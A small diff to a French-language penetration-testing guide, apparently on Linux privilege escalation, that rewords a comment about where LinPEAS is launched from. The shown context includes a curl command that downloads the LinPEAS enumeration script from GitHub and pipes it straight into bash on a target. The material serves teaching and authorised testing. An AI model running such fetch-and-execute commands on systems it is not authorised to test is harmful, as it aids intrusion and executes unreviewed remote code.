@@ -93,7 +93,7 @@ ss -tulnp
 ### Enumeration rapide avec LinPEAS
 
 ```bash
-# - Telecharger et executer LinPEAS depuis Exegol
+# - Telecharger et executer LinPEAS depuis votre machine d'attaque
 curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
 
 # - Ou le transferer et l'executer sur la cible
